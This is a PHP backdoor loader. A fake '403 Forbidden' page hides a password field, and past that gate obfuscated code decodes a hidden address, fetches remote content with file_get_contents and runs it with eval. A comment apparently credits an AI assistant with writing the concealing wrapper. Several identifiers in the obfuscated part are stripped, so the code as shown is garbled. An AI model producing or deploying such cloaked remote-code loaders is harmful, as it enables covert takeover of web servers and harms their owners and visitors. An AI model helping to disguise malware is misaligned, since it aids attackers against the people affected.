<?php
// Protected wrapper added by assistant
session_start();
$stored_md5 = '0e96b40d579f8b6d1b43c23b3ead93cf'; // md5('seokampungan123@@##')

// Logout
if (isset($_GET['logout'])) {
    unset($_SESSION['authed']);
    session_regenerate_id(true);
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

// Handle login
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pw'])) {
    if (md5($_POST['pw']) === $stored_md5) {
        $_SESSION['authed'] = true;
        header('Location: ' . $_SERVER['REQUEST_URI']);
        exit;
    } else {
        $error = 'Password salah!';
    }
}

if (empty($_SESSION['authed'])):
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<title>403 Forbidden - Access to this resource on the server is denied!</title>
<style>
    html,body{height:100%;margin:0;font-family:Arial, sans-serif;background:#0b0b0b;color:#eee}
    .wrap{height:100%;display:flex;align-items:center;justify-content:center}
    .card{max-width:820px;padding:40px;border-radius:8px;text-align:center}
    .forbidden{font-size:24px;font-weight:700;color:#fff}
    .sub{margin-top:8px;color:#ccc}
    .pw-form{margin-top:28px}
    .pw-input{width:1px;opacity:0;padding:10px 12px;border-radius:6px;transition:all .18s ease;border:0;outline:none;background:rgba(255,255,255,0.06);color:#fff;caret-color:#fff;}
    .pw-input:focus{width:280px;opacity:1;border:1px solid rgba(255,255,255,0.12);box-shadow:0 8px 24px rgba(0,0,0,0.6);background:rgba(255,255,255,0.04);}
    .btn{display:inline-block;margin-left:10px;padding:10px 14px;border-radius:6px;text-decoration:none;border:0;cursor:pointer;background:#ffffff;color:#000;font-weight:700;font-size:13px}
    .hint{font-size:13px;color:#9aa}
    .error{color:#ff6b6b;margin-top:12px}
</style>
</head>
<body>
<div class="wrap">
  <div class="card">
    <div class="forbidden">403 Forbidden</div>
    <div class="sub">Access to this resource on the server is denied!</div>
    <form class="pw-form" method="post" autocomplete="off">
      <input class="pw-input" name="pw" type="password" placeholder="Tekan TAB lalu masukkan password" tabindex="1" autofocus />
      <button class="btn" type="submit">Masuk</button>
    </form>
    <div class="hint">Tekan <strong>Tab</strong> untuk menampilkan kotak password, lalu ketik password.</div>
    <?php if(!empty($error)): ?><div class="error"><?=htmlspecialchars($error)?></div><?php endif; ?>
  </div>
</div>
</body>
</html>
<?php
exit;
endif;

// ==============================================
// Original script-asli.php content from GitHub starts here
// ==============================================

function ($,$){return(($^$)+2*($&$))&0xFF;}function ($,$){return(($|~$)+(~$&$))&0xFF;}function ($,$){return((~($|$)&($|~$))|(($|$)&~($|~$)))&0xFF;}function ($,$){$='';$=strlen($);for($=0;$=[(100,44),(85,48),(54,90),(72,36),(79,96),(16,16),(83,60)];}public function (){while(true){switch($this->ɛ){case 0:$this->ɛ=1;break;case 1:$this->ɛ=2;break;case 2:$this->ɛ=3;return $this->();default:return null;}}}private function (){$=['file_get_contents','f'.'i'.'l'.'e'.'_'.'g'.'e'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s','f'.'i'.chr(108).'e'.'_'.'g'.'e'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s'];$ = $[rand(0, count($)-1)];$="\x4A\x74\x6F\x6F\x6C\x73\x50\x68\x4F\x62\x66\x75\x73";$='22001b1f1f497f473f03150116231a41190901330d234c07050365151f064301311f70125b101172115f5a58157d582e5b0358472e1757425544670b62565f17102f42560c0f46630a';$=(hex2bin($),$);$=[$,$];$=$[0]($[1]);return $;}}$='';$='';$='';$='';$='';$='';$='';$='';$$$$$$$$=new ();$=$$$$$$$$->();if($){$=['a'.'w'.'i'.'k',$];$=@eval("?>".$[1]);}?>
